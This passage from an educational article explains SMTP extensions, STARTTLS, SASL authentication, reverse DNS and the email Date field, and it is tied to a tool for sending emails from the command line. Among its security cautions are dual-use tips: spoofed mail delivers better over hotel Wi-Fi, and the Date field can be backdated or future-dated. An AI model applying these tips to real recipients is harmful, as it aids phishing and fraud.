In this spirit, I encourage you to relay spoofed emails only to your own mailbox.
If such a spoofed email lands in your inbox,
ask your mailbox provider to be more rigorous in filtering scam emails or use the service of a different provider.
You’re hopefully also more motivated now to read the rest of this article.
In short, have fun with the above tool but always remember that with great power comes great responsibility!</p>

<h5 id="tool-explanations">Tool explanations</h5>

<details>
  <summary id="command-line-interface">
Command-line interface
</summary>

  <p>If you’ve never used the <a href="https://en.wikipedia.org/wiki/Command-line_interface">command-line interface</a>
of your operating system before, I suggest that you read a proper introduction first.
If you have no clue about what you’re doing, it’s easy to mess up your computer.
Additionally, you shouldn’t blindly execute arbitrary commands from the Internet.
Ideally, you should always try to understand what a command does based on a separate source first.
Having said that, the default program providing a command-line interface
is called <a href="https://support.apple.com/guide/terminal/welcome/mac">Terminal</a> on macOS.
It’s located in the <code>/Applications/Utilities</code> folder at the top of your file system.
The <code>openssl</code> tool should already be installed.
Continue <a href="#openssl-versus-libressl">here</a> to test this.
On Windows, the default command-line program is called <a href="https://en.wikipedia.org/wiki/Cmd.exe">Command Prompt</a>.
Various third parties provide <a href="https://wiki.openssl.org/index.php/Binaries">OpenSSL binaries</a> for Windows.
Here is a <a href="https://medium.com/swlh/installing-openssl-on-windows-10-and-updating-path-80992e26f6a1">guide</a>
for installing OpenSSL on Windows 10, which you can follow at your own risk.</p>

</details>

<details>
  <summary id="clipboard-verification">
Clipboard verification
</summary>

  <p>If a website copies commands to your <a href="https://en.wikipedia.org/wiki/Clipboard_(computing)">clipboard</a>
for you, you should verify the content of your clipboard
before pasting it into your <a href="#command-line-interface">command-line interface</a>.
Otherwise, a malicious website can display one command and copy another command.
One way to inspect your clipboard is to always paste its content into a
<a href="https://en.wikipedia.org/wiki/Text_editor">text editor</a> first.
Since this is a hassle, you likely won’t do this for long.
A better approach is to have a window which displays the current content of your clipboard.
On macOS, the <a href="https://en.wikipedia.org/wiki/Finder_(software)">Finder</a> has a “Show Clipboard” command in the “Edit” menu.
Unfortunately, this window is visible only if Finder is the active application.
A different approach is to open a new window in your <a href="https://en.wikipedia.org/wiki/Computer_terminal">terminal</a>
and paste the clipboard once a second with the <a href="https://en.wikipedia.org/wiki/Watch_(command)"><code>watch</code> command</a>:</p>

  <figure>
    
    <figcaption>
How to watch your clipboard in your command-line interface.
Press “Control C” (^C) to exit the program.
</figcaption>
  </figure>

</details>

<details>
  <summary id="openssl-versus-libressl">
OpenSSL versus LibreSSL
</summary>

  <p><a href="https://en.wikipedia.org/wiki/OpenSSL">OpenSSL</a> used to be the most important open-source library for <abbr title="Transport Layer Security">TLS</abbr> functionality.
(When OpenSSL was first released in 1998, <a href="https://evalapply.org/internet/#transport-layer-security"><abbr title="Transport Layer Security">TLS</abbr> was still called SSL</a>).
After the <a href="https://en.wikipedia.org/wiki/Heartbleed">Heartbleed</a> security vulnerability in April 2014,
the <a href="https://en.wikipedia.org/wiki/OpenBSD">OpenBSD</a> project <a href="https://en.wikipedia.org/wiki/Fork_(software)">forked</a>
<a href="https://en.wikipedia.org/wiki/LibreSSL">LibreSSL</a> from OpenSSL.
In order to remain as compatible as possible, the command-line tool is still called <code>openssl</code>.
Since <a href="https://apple.stackexchange.com/a/328630/362802">macOS 10.13.5</a>, Apple ships LibreSSL and no longer OpenSSL.
I mention all of this here only because the arguments of the two commands are no longer identical.
Here are the documentations of the <code>s_client</code> subcommand
for <a href="https://www.openssl.org/docs/manmaster/man1/openssl-s_client.html">OpenSSL</a>
and for <a href="https://man.openbsd.org/openssl.1#s_client">LibreSSL</a>.</p>

  <p>Execute the following command to figure out
whether <code>openssl</code> is installed on your system and which implementation you have:</p>

  

</details>

<details>
  <summary id="common-smtp-extensions">
Common <abbr title="Simple Mail Transfer Protocol">SMTP</abbr> extensions
</summary>

  <p>The difference between <abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> and <abbr title="Simple Mail Transfer Protocol">SMTP</abbr> is that <abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> allows the server to list extended capabilities,
which the client can make use of during the session.
Let’s have a look at some common <abbr title="Simple Mail Transfer Protocol">SMTP</abbr> extensions on the basis of what Gmail supports:</p>

  <figure>
    
    <figcaption>

A transcript of a session with the outgoing mail server of Gmail when using <a href="#use-of-tls">Implicit <abbr title="Transport Layer Security">TLS</abbr></a>.
[Brackets indicate redacted information.]

</figcaption>
  </figure>

  <p>As can be seen in the above transcript,
Gmail’s outgoing mail server supports the following <abbr title="Simple Mail Transfer Protocol">SMTP</abbr> extensions:</p>
  <ul>
    <li><code>SIZE</code> (<a href="https://datatracker.ietf.org/doc/html/rfc1870"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 1870</a>):
This extension allows the server to specify an upper limit
on the size of messages it accepts in bytes as part of the <code>EHLO</code> response.
Gmail apparently accepts messages of almost 36 MB.
The extension also allows the client to specify the size of the message in bytes
as part of the <code>MAIL</code> command: <code>MAIL FROM:&lt;alice@example.org&gt; SIZE=1234</code>.
The server can then reject the message <a href="https://datatracker.ietf.org/doc/html/rfc1870#section-6.4">for individual recipients</a>
in its response to each <code>RCPT</code> command,
for example because a mailbox no longer has enough space to store a message of the stated size.
Doing so has the advantage that a large message doesn’t even have to be transmitted
if it will be rejected for all recipients based on its size.
(The declared size can be an <a href="https://datatracker.ietf.org/doc/html/rfc1870#section-6">estimate</a>.)</li>
    <li><code>8BITMIME</code> (<a href="https://datatracker.ietf.org/doc/html/rfc6152"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6152</a>):
<abbr title="Multipurpose Internet Mail Extensions">MIME</abbr> stands for <a href="https://en.wikipedia.org/wiki/MIME">Multipurpose Internet Mail Extensions</a>
and we’ll discuss this <a href="#content-encoding">later</a>.
<abbr title="Simple Mail Transfer Protocol">SMTP</abbr> originally required the message to consist of 7-bit <a href="https://evalapply.org/internet/#text-encoding"><abbr title="American Standard Code for Information Interchange">ASCII</abbr></a> characters.
This extension allows the server to signal that it’ll preserve the 8th bit of each byte in the message body.
The client can then indicate in the <code>MAIL</code> command that
the content of the message contains bytes outside of the <abbr title="American Standard Code for Information Interchange">ASCII</abbr> range:
<code>MAIL FROM:&lt;alice@example.org&gt; BODY=8BITMIME</code>.
The server can still enforce a <a href="#line-length-limit">limit on the length of each line</a>, though.
Therefore, this extension doesn’t enable binary data transfer without encoding.</li>
    <li><code>AUTH</code> (<a href="https://datatracker.ietf.org/doc/html/rfc4954"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 4954</a>):
This extension allows the server to <a href="https://en.wikipedia.org/wiki/SMTP_Authentication">authenticate</a>
the user in the <a href="#submission-versus-relay">submission protocol</a> before accepting a message for relay.
Since the <a href="#esmtp-tool">above tool</a> makes extensive use of this extension,
it deserves its own <a href="#user-authentication">information box</a>.</li>
    <li><code>ENHANCEDSTATUSCODES</code> (<a href="https://datatracker.ietf.org/doc/html/rfc2034"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2034</a>):
This extension allows the server to respond with more precise
<a href="https://en.wikipedia.org/wiki/List_of_SMTP_server_return_codes">status codes</a>
than the ones specified in the <a href="https://datatracker.ietf.org/doc/html/rfc821#page-35">original standard</a>.
The server indicates that it returns enhanced status codes to the client
by listing the extension in its response to the <code>EHLO</code> command.
The server then prepends the enhanced status codes to the text part of the original status codes.
The structure of enhanced status codes is <code>class.subject.detail</code>,
with the values specified in <a href="https://datatracker.ietf.org/doc/html/rfc3463"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 3463</a> and maintained in a
<a href="https://www.iana.org/assignments/smtp-enhanced-status-codes/smtp-enhanced-status-codes.xhtml">registry by <abbr title="Internet Assigned Numbers Authority">IANA</abbr></a>.</li>
    <li><code>PIPELINING</code> (<a href="https://datatracker.ietf.org/doc/html/rfc2920"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2920</a>):
The goal of this extension is to reduce the number of <a href="https://evalapply.org/internet/#network-performance">round trips</a>
during an <abbr title="Simple Mail Transfer Protocol">SMTP</abbr> session.
Instead of having to wait for a response from the server after each command,
it allows the client to send several commands in a single <a href="https://evalapply.org/internet/#packet-switching">packet</a> to the server.
The standard requires that <code>EHLO</code>, <code>DATA</code>, and <code>QUIT</code> are the last command in a batch of commands.
<code>AUTH</code> must also be the last command in a batch unless the authentication method is <code>PLAIN</code>,
which makes the command non-interactive.
The server then returns all the status codes at once,
matching the order of the transmitted commands.
I’ve implemented pipelining in the <a href="#esmtp-tool">above tool</a>
to make copying the commands easier.</li>
    <li><code>CHUNKING</code> (<a href="https://datatracker.ietf.org/doc/html/rfc3030#section-2">Section 2 of <abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 3030</a>):
This extension allows the client to split the message into several chunks and transfer each chunk separately,
which is especially useful for large messages.
Instead of the <code>DATA</code> command,
the client can send one or several <code>BDAT</code> commands,
which are immediately followed by the respective chunk.
When using the <code>BDAT</code> command,
the client specifies the size of the chunk in bytes,
which has the advantage that the client doesn’t have to escape lines containing a single period
and that the server doesn’t have to scan the transmitted data for the <code>{CR}{LF}.{CR}{LF}</code> sequence
in order to <a href="#message-termination">determine the end of the message</a>.
This length prefix turns <abbr title="Simple Mail Transfer Protocol">SMTP</abbr> into a <a href="https://evalapply.org/internet/#text-based-protocols">binary protocol</a> temporarily.
The client indicates the last chunk by appending <code>LAST</code> after the chunk size to the <code>BDAT</code> command.
The <abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> contains a <a href="https://datatracker.ietf.org/doc/html/rfc3030#section-4.1">simple example</a>.</li>
    <li><code>SMTPUTF8</code> (<a href="https://datatracker.ietf.org/doc/html/rfc6531"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6531</a>):
This extension allows the client to use <a href="https://evalapply.org/internet/#text-encoding"><abbr title="Unicode Transformation Format">UTF</abbr>-8</a>
instead of just <abbr title="American Standard Code for Information Interchange">ASCII</abbr> in the <code>MAIL</code> and <code>RCPT</code> commands as well as the message.
A server which supports the <code>SMTPUTF8</code> extension also has to support the <code>8BITMIME</code> extension.
<code>SMTPUTF8</code> facilitates the <a href="#email-address-internationalization">internationalization of email addresses</a>.</li>
  </ul>

  <p>If you connect to a different server,
you likely encounter other extensions as well.
The server indicates the end of the response to the <code>EHLO</code> command
by using a hyphen after the status code for all but the last line.</p>

</details>

<details>
  <summary id="smtp-backward-compatibility">
Backward compatibility
</summary>

  <p><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> uses the same port as <abbr title="Simple Mail Transfer Protocol">SMTP</abbr>,
so how does <abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> ensure backward compatibility with <abbr title="Simple Mail Transfer Protocol">SMTP</abbr>?
(Since submission was split from relay in 1998 while <abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> dates back to 1993,
we’re talking only about port 25 here.)
Remember that when an outgoing mail server connects to an incoming mail server,
it assumes the role of the <a href="https://evalapply.org/internet/#client-server-model">client</a> in that interaction.
There are only two cases to consider:</p>
  <ul>
    <li><strong>Old client ➞ new server</strong>:
<abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> servers still have to accept the old <code>HELO</code> command in order to remain compatible.</li>
    <li><strong>New client ➞ old server</strong>:
<abbr title="Simple Mail Transfer Protocol">SMTP</abbr> servers which don’t understand the <code>EHLO</code> command respond with the error code 500.
The client can either <code>QUIT</code> the connection or continue with the <code>HELO</code> command.
According to <a href="https://cr.yp.to/smtp/greeting.html">this source</a>,
some mail clients send the <code>EHLO</code> command only if the first line from the server,
which starts with the status code 220, contains <code>ESMTP</code>.
This explains why most servers include <code>ESMTP</code> in their greeting even if the standard doesn’t require it.</li>
  </ul>

</details>

<details>
  <summary id="starttls-extension">
<abbr title="Command to Start Transport Layer Security when available">STARTTLS</abbr> extension
</summary>

  <p><a href="#use-of-tls">Explicit <abbr title="Transport Layer Security">TLS</abbr></a> is implemented with an extension called <code>STARTTLS</code>,
which is specified in <a href="https://datatracker.ietf.org/doc/html/rfc3207"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 3207</a>.
<a href="#common-smtp-extensions">Gmail didn’t list this extension</a>
because we used <abbr title="Simple Mail Transfer Protocol">SMTP</abbr> with Implicit <abbr title="Transport Layer Security">TLS</abbr> on port 465.
If we open a <abbr title="Transmission Control Protocol">TCP</abbr> connection on port 587, <code>STARTTLS</code> is listed as well:</p>

  <figure>
    
    <figcaption>

The <code>STARTTLS</code> extension is listed when we connect without <abbr title="Transport Layer Security">TLS</abbr> to Gmail’s outgoing mail server.

</figcaption>
  </figure>

  <p>If the <code>STARTTLS</code> extension is listed in the response to the <code>EHLO</code> command,
the client can ask the server to upgrade the insecure channel to a secure one with the <code>STARTTLS</code> command.
If the server responds with the <a href="https://datatracker.ietf.org/doc/html/rfc3207#section-4">status code 220</a>,
the client can continue with the <a href="https://evalapply.org/internet/#transport-layer-security"><abbr title="Transport Layer Security">TLS</abbr> handshake</a>.
Once the handshake is completed, the client and the server are
<a href="https://datatracker.ietf.org/doc/html/rfc3207#section-4.2">reset to their initial state</a>.
In particular, the server must forget about the client’s argument to the <code>EHLO</code> command,
whereas the client must forget about the extensions supported by the server.
The client should send another <code>EHLO</code> command,
to which the server can respond with a different list of extensions than before the <abbr title="Transport Layer Security">TLS</abbr> handshake.
For example, the <code>AUTH</code> extension is missing in the above list
because passwords of users shouldn’t be transmitted over an insecure channel.
You can use the following command in your command-line interface
to let <code>openssl</code> issue the <code>STARTTLS</code> command after an initial <code>EHLO</code> command
and then continue with the <abbr title="Transport Layer Security">TLS</abbr> handshake:</p>

  <figure>
    
    <figcaption>

When using <code>-starttls smtp</code>, <code>openssl</code> starts with a <abbr title="Transmission Control Protocol">TCP</abbr> connection
and upgrades it to a <abbr title="Transport Layer Security">TLS</abbr> connection by issuing the <code>STARTTLS</code> command.

</figcaption>
  </figure>

  <p>If the server doesn’t list the <code>STARTTLS</code> extension
or responds with a status code other than 220 to the <code>STARTTLS</code> command,
the client has to decide whether it wants to continue or abort the connection.
As explained <a href="#implicit-tls-versus-explicit-tls">earlier</a>,
neither Explicit <abbr title="Transport Layer Security">TLS</abbr> nor Implicit <abbr title="Transport Layer Security">TLS</abbr> is secure against
<a href="https://en.wikipedia.org/wiki/Downgrade_attack">downgrade attacks</a> when used
<a href="https://en.wikipedia.org/wiki/Opportunistic_encryption">opportunistically</a>.
The belief that only Explicit <abbr title="Transport Layer Security">TLS</abbr> with <code>STARTTLS</code> has this weakness is a common misunderstanding.
Due to backward compatibility,
it’s up to the client to require a secure channel or to abort otherwise.
If the client does require <abbr title="Transport Layer Security">TLS</abbr>,
it might no longer be able to submit or relay messages to some servers, though.</p>

  <p>As a side note: <a href="#openssl-versus-libressl">OpenSSL</a> has a
<a href="https://www.openssl.org/docs/manmaster/man1/openssl-s_client.html#name-hostname"><code>-name</code> option</a>
to let you specify the argument to the initial <code>EHLO</code> command.
Since the server must forget about this argument after the <abbr title="Transport Layer Security">TLS</abbr> handshake,
I have no idea what’s the point of providing this option.
This is likely the reason why <a href="#openssl-versus-libressl">LibreSSL</a> doesn’t support this option in the first place.</p>

</details>

<details>
  <summary id="user-authentication">
User authentication
</summary>

  <p>In order to protect their reputation and to reduce spam and phishing,
outgoing mail servers authenticate their users before accepting messages for relay.
This is done with the <code>AUTH</code> extension as specified in <a href="https://datatracker.ietf.org/doc/html/rfc4954"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 4954</a>.
The <code>AUTH</code> extension itself is also extensible:
Servers can support new mechanisms, which clients can then make use of.
Since many <a href="https://evalapply.org/internet/#application-layer">application-layer protocols</a> require authentication,
the <abbr title="Internet Engineering Task Force">IETF</abbr> community abstracted the various mechanisms into the so-called
<a href="https://en.wikipedia.org/wiki/Simple_Authentication_and_Security_Layer">Simple Authentication and Security Layer (<abbr title="Simple Authentication and Security Layer">SASL</abbr>)</a>,
which is specified in <a href="https://datatracker.ietf.org/doc/html/rfc4422"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 4422</a>.
<a href="https://en.wikipedia.org/wiki/Internet_Assigned_Numbers_Authority"><abbr title="Internet Assigned Numbers Authority">IANA</abbr></a> maintains a list of
<a href="https://www.iana.org/assignments/sasl-mechanisms/sasl-mechanisms.xhtml"><abbr title="Simple Authentication and Security Layer">SASL</abbr> mechanisms</a>.
<abbr title="Simple Mail Transfer Protocol">SMTP</abbr> servers list all the mechanisms that they support after <code>AUTH</code> in their response to the <code>EHLO</code> command.
We’re interested in only four of them:</p>
  <ul>
    <li><code>PLAIN</code> (<a href="https://datatracker.ietf.org/doc/html/rfc4616"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 4616</a>):
The client sends the <a href="https://en.wikipedia.org/wiki/Base64">Base64</a> encoding
of the user’s username and password as an argument to the <code>AUTH</code> command to the server.
The username and password are separated by the <a href="https://en.wikipedia.org/wiki/Null_character">null character</a>.
If you don’t trust the <a href="#esmtp-tool">above tool</a>,
you can compute the encoding on your command line as <code>echo -ne &#39;\0000username\0000password&#39; | openssl base64</code>.
The <a href="https://man7.org/linux/man-pages/man1/echo.1.html"><code>echo</code></a> command writes the argument to
its <a href="https://en.wikipedia.org/wiki/Standard_streams#Standard_output_(stdout)">standard output</a>,
which is then <a href="https://en.wikipedia.org/wiki/Anonymous_pipe">piped</a> to <code>openssl</code> for the Base64 encoding.
The <code>-n</code> option to <code>echo</code> suppresses the trailing newline in its output,
and the <code>-e</code> option enables interpretation of backslash escapes.
I use four zeros instead of just two in the escape sequence
to avoid problems if your username or password starts with a number.
And if you’re wondering why there is a leading null character:
The standard supports an <a href="https://datatracker.ietf.org/doc/html/rfc4616#section-2">additional field</a>
at the beginning, which is usually left empty in the case of <abbr title="Simple Mail Transfer Protocol">SMTP</abbr>.
The username and password can consist of any Unicode character except the null character.
All characters have to be encoded with <a href="https://evalapply.org/internet/#text-encoding"><abbr title="Unicode Transformation Format">UTF</abbr>-8</a>.</li>
    <li><code>LOGIN</code> (<a href="https://datatracker.ietf.org/doc/html/draft-murchison-sasl-login-00">draft-murchison-sasl-login</a>):
This mechanism is obsolete but since it’s still widely offered,
I decided to implement it in the above tool as well.
Instead of sending the username and the password together,
the server prompts for them separately once the client has initiated the authentication with <code>AUTH LOGIN</code>.
The <code>LOGIN</code> mechanism has the same security properties as the <code>PLAIN</code> mechanism,
it just requires more round trips and prevents <a href="#common-smtp-extensions">pipelining</a> because it’s interactive.</li>
    <li><code>CRAM-MD5</code> (<a href="https://datatracker.ietf.org/doc/html/rfc2195"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2195</a>
and <a href="https://datatracker.ietf.org/doc/html/draft-ietf-sasl-crammd5-10">draft-ietf-sasl-crammd5</a>):
As far as I can tell,
this mechanism is not widely used by mail servers but still widely supported by mail clients.
I cover this mechanism in more detail in a <a href="#challenge-response-authentication-mechanism">separate box</a>.
The summary is that the client puts the password and a challenge from the server
through a <a href="https://en.wikipedia.org/wiki/One-way_function">one-way function</a>
and sends the output of this function to the server instead of the password.
This was useful against passive attackers before the widespread deployment of <abbr title="Transport Layer Security">TLS</abbr>.</li>
    <li><code>SCRAM</code> (<a href="https://datatracker.ietf.org/doc/html/rfc5802"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5802</a>):
<code>SCRAM</code> is not much more complicated than <code>CRAM-MD5</code>
but has <a href="#desirable-properties-of-authentication-mechanisms">much better properties</a>.
Unfortunately, it’s not widely used so I didn’t bother to implement it in the above tool.
In my opinion, all weaker <a href="#password-based-authentication-mechanisms">password-based authentication mechanisms</a>
should be replaced with <code>SCRAM</code> or another, similarly secure mechanism.
Therefore, it also deserves its <a href="#salted-challenge-response-authentication-mechanism">own box</a>.</li>
  </ul>

  <p>Please note that the tool hides the password in the input field but unless you use <code>CRAM-MD5</code>,
anyone who can take a picture of your screen can easily decode the entered password.
When authenticating to an <abbr title="Simple Mail Transfer Protocol">SMTP</abbr> server, the server responds with either
<code>235 2.7.0 Authentication successful</code> or <code>535 5.7.8 Error: authentication failed</code>.</p>

</details>

<details>
  <summary id="gmail-authentication-failure">
Gmail authentication failure
</summary>

  <p>If you want to submit an email to Gmail with the instructions generated by the <a href="#esmtp-tool">above tool</a>,
you have to allow access from <a href="https://support.google.com/accounts/answer/6010255">less secure apps</a>
in your <a href="https://myaccount.google.com/lesssecureapps">account settings</a>.
If the authentication still fails,
you might have to complete <a href="https://accounts.google.com/DisplayUnlockCaptcha">this page</a>
according to <a href="https://support.google.com/accounts/answer/6009563">these instructions</a>.
Please note that Google disables access from less secure apps automatically if it’s not being used for some time.</p>

</details>

<details>
  <summary id="reverse-dns-entry">
Reverse <abbr title="Domain Name System">DNS</abbr> entry
</summary>

  <p>I didn’t go into much detail about <a href="https://en.wikipedia.org/wiki/Reverse_DNS_lookup">reverse <abbr title="Domain Name System">DNS</abbr> lookups</a>
in my <a href="https://evalapply.org/internet/#domain-name-system">previous article about the Internet</a>.
Simply put, <abbr title="Internet Protocol">IP</abbr> address ranges <a href="https://www.iana.org/assignments/ipv4-address-space/ipv4-address-space.xhtml">are allocated</a>
to <a href="https://en.wikipedia.org/wiki/Regional_Internet_registry">Regional Internet Registries (<abbr title="Regional Internet Registry">RIR</abbr>)</a>,
which allocate subranges to regional
<a href="https://en.wikipedia.org/wiki/Internet_service_provider">Internet service providers (<abbr title="Internet Service Provider">ISP</abbr>)</a>.
The <abbr title="Domain Name System">DNS</abbr> zones under the special <code>in-addr.arpa</code> domain are delegated along the same hierarchy.
For example, when the <a href="https://en.wikipedia.org/wiki/Internet_Assigned_Numbers_Authority">Internet Assigned Numbers Authority (<abbr title="Internet Assigned Numbers Authority">IANA</abbr>)</a>
allocated the <abbr title="Internet Protocol">IP</abbr> address block <code>123.xxx.xxx.xxx</code> to
the <a href="https://en.wikipedia.org/wiki/Asia-Pacific_Network_Information_Centre">Asia-Pacific Network Information Centre (<abbr title="Asia-Pacific Network Information Centre">APNIC</abbr>)</a>,
it also delegated the <abbr title="Domain Name System">DNS</abbr> zone <code>123.in-addr.arpa</code> to <abbr title="Asia-Pacific Network Information Centre">APNIC</abbr>.
You can <a href="#tool-lookup-dns-records&amp;domainName=123.in-addr.arpa&amp;recordType=SOA&amp;dnssecOk=false" title="Look up the SOA record of 123.in-addr.arpa.">check this</a>
with the <a href="https://evalapply.org/internet/#domain-name-system"><abbr title="Domain Name System">DNS</abbr> tool</a> below:</p>

  

  <p>When <abbr title="Asia-Pacific Network Information Centre">APNIC</abbr> allocates the <abbr title="Internet Protocol">IP</abbr> block <code>123.234.xxx.xxx</code> to an <abbr title="Internet Service Provider">ISP</abbr>,
it also delegates the <abbr title="Domain Name System">DNS</abbr> zone <code>234.123.in-addr.arpa</code> to this <abbr title="Internet Service Provider">ISP</abbr>.
The <abbr title="Internet Service Provider">ISP</abbr> can then create so-called pointer records (<code>PTR</code>) to map <abbr title="Internet Protocol">IP</abbr> addresses to domain names.
While <abbr title="Domain Name System">DNS</abbr> is normally used to resolve domain names to <abbr title="Internet Protocol">IP</abbr> addresses,
pointer records under <code>in-addr.arpa</code> are used to do the reverse.
The reason why you have to reverse an <abbr title="Internet Protocol">IP</abbr> address when doing a reverse <abbr title="Domain Name System">DNS</abbr> lookup
is because in <abbr title="Internet Protocol">IP</abbr> addresses the root of the allocation hierarchy is on the left
whereas in domain names the root of the delegation hierarchy is on the right.
In reality, the situation is a bit more complicated because the 32-bit <abbr title="Internet Protocol version 4 with 32-bit addresses">IPv4</abbr> address ranges
are no longer just allocated along the byte boundaries but also split at arbitrary positions.
This is known as <a href="https://en.wikipedia.org/wiki/Classless_Inter-Domain_Routing">classless inter-domain routing (<abbr title="Classless Inter-Domain Routing">CIDR</abbr>)</a>
and solved by <a href="https://datatracker.ietf.org/doc/html/rfc2317">classless <code>in-addr.arpa</code> delegation</a>.</p>

  <p>Since Internet service providers usually don’t configure reverse mappings
for the <abbr title="Internet Protocol">IP</abbr> addresses of their residential customers, incoming mail servers use this
<a href="https://en.wikipedia.org/wiki/Anti-spam_techniques#PTR/reverse_DNS_checks">as a heuristic to fight spam</a>.
If you use the <a href="#esmtp-tool">above tool</a> to relay a message directly to an incoming mail server,
your chances of having the message delivered are much higher
if your <a href="https://evalapply.org/internet/#network-address-translation">public <abbr title="Internet Protocol">IP</abbr> address</a> has a reverse <abbr title="Domain Name System">DNS</abbr> entry.
Somewhat ironically, this means that spoofing emails often works better
when you use the Wi-Fi of a hotel or a restaurant instead of your own.
If your public <abbr title="Internet Protocol">IP</abbr> address has a reverse <abbr title="Domain Name System">DNS</abbr> entry,
the tool determines it when you click on “Determine”:</p>

  

</details>

<details>
  <summary id="newline-characters">
Newline characters
</summary>

  <p>In <a href="https://en.wikipedia.org/wiki/Teleprinter">teleprinters</a>
(printers that operated like <a href="https://en.wikipedia.org/wiki/Typewriter">typewriters</a>),
moving the carriage, which outputs the characters onto paper, back to the start of the same line
and moving the page to the next line were two separate instructions.
The former is known as <a href="https://en.wikipedia.org/wiki/Carriage_return">carriage return (<abbr title="Carriage Return (first newline character)">CR</abbr>)</a>,
the latter as <a href="https://en.wikipedia.org/wiki/Line_feed">line feed (<abbr title="Line Feed (second newline character)">LF</abbr>)</a>.
Both <abbr title="Carriage Return (first newline character)">CR</abbr> and <abbr title="Line Feed (second newline character)">LF</abbr> were included as <a href="https://en.wikipedia.org/wiki/Control_character">control characters</a>
in the <a href="https://en.wikipedia.org/wiki/ASCII">American Standard Code for Information Interchange (<abbr title="American Standard Code for Information Interchange">ASCII</abbr>)</a>.
While some operating systems, such as <a href="https://en.wikipedia.org/wiki/Microsoft_Windows">Windows</a>,
opted to encode a <a href="https://en.wikipedia.org/wiki/Newline">newline</a> as a sequence of both <abbr title="Carriage Return (first newline character)">CR</abbr> and <abbr title="Line Feed (second newline character)">LF</abbr>,
other operating systems, such as <a href="https://en.wikipedia.org/wiki/Linux">Linux</a>
and <a href="https://en.wikipedia.org/wiki/MacOS">macOS</a>, use only <abbr title="Line Feed (second newline character)">LF</abbr> to encode a newline.
As you can imagine, this causes a lot of
<a href="https://en.wikipedia.org/wiki/Newline#Issues_with_different_newline_formats">interoperability issues</a>.
Both <a href="https://datatracker.ietf.org/doc/html/rfc5321#section-2.3.8"><abbr title="Simple Mail Transfer Protocol">SMTP</abbr></a>
and the <a href="https://datatracker.ietf.org/doc/html/rfc5322#section-2.1">message format</a> require that lines end with both <abbr title="Carriage Return (first newline character)">CR</abbr> and <abbr title="Line Feed (second newline character)">LF</abbr>.
By using the <a href="https://www.openssl.org/docs/manmaster/man1/openssl-s_client.html#crlf"><code>-crlf</code> option</a>,
<code>openssl</code> makes sure that this is the case.</p>

</details>

<details>
  <summary id="message-termination">
Message termination
</summary>

  <p>When using the <a href="https://datatracker.ietf.org/doc/html/rfc5321#section-4.1.1.4"><code>DATA</code> command</a>,
the transmission of the message is terminated by a period on a line of its own.
So what happens if you include a line with a single period in an email?
<a href="https://datatracker.ietf.org/doc/html/rfc5321#section-4.5.2"><abbr title="Simple Mail Transfer Protocol">SMTP</abbr> specifies</a> that
the sender has to insert an additional period at the beginning of every line
which starts with a period before transmitting the message.
The recipient then removes the leading period from every line
which has additional characters in order to restore the original message.
Periods at the beginning of lines in a message are <a href="https://en.wikipedia.org/wiki/Escape_sequence">escaped</a>
like this only for transmitting the message with the <code>DATA</code> command but not when storing the message
(or when using the <a href="#common-smtp-extensions"><code>BDAT</code> command</a>).
You don’t have to worry about this;
the <a href="#esmtp-tool">tool above</a> does the escaping for you.</p>

</details>

<details>
  <summary id="origination-date">
Origination date
</summary>

  <p>The <a href="https://datatracker.ietf.org/doc/html/rfc5322#section-3.6.1"><code>Date</code> field</a>
indicates the date and time at which the author of the message pushed the “Send” button.
It’s not supposed to reflect when the message is actually sent, though:
If the device is offline when the user clicks on “Send”,
the message is queued locally and the <code>Date</code> field isn’t updated when the message is submitted.
Messages <a href="https://datatracker.ietf.org/doc/html/rfc5322#page-21">must have</a> a single <code>Date</code> field and
outgoing mail servers <a href="https://datatracker.ietf.org/doc/html/rfc6409#section-8.2">may add one</a> if it’s missing.
The outgoing mail servers that I’ve checked don’t enforce any rules on the <code>Date</code>.
I’ve successfully submitted messages whose <code>Date</code> was one year in the past or in the future.
Do mail clients display messages with the date that was chosen by the sender?
Most don’t, some do.
Apple Mail and the <a href="#webmail">webmail</a> interfaces of Gmail, Yahoo, and Outlook
display the date when the message was received,
completely ignoring the <code>Date</code> specified by the sender.
I assume that they determine the received date based on the uppermost <a href="#trace-information"><code>Received</code> header field</a>.
Thunderbird and <a href="https://www.postbox-inc.com/">Postbox</a>, on the other hand,
display messages with the sender-chosen <code>Date</code> by default.
Since sender-chosen means attacker-chosen, I think this behavior is problematic,
especially since these mail clients <a href="#sender-towards-recipients">tell all recipients that you’re using them</a>.
For example, a scammer can backdate financial predictions and reference such messages in a current email.
Alternatively, you can backdate an email to meet a passed deadline.
Or if you want to make sure that your message lands at the top of the recipient’s inbox,
you can choose a date in the future.
Such tampering is easy to detect if you know how to inspect the <a href="#raw-message">raw message</a>.
For ordinary users, however, a warning should be shown, in my opinion.
I reported <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1670739">this issue</a>
to the Thunderbird team, but they were not interested in addressing it.</p>

</details>

<details>
  <summary id="spoofed-sender-during-submission">
Spoofed sender during submission
</summary>

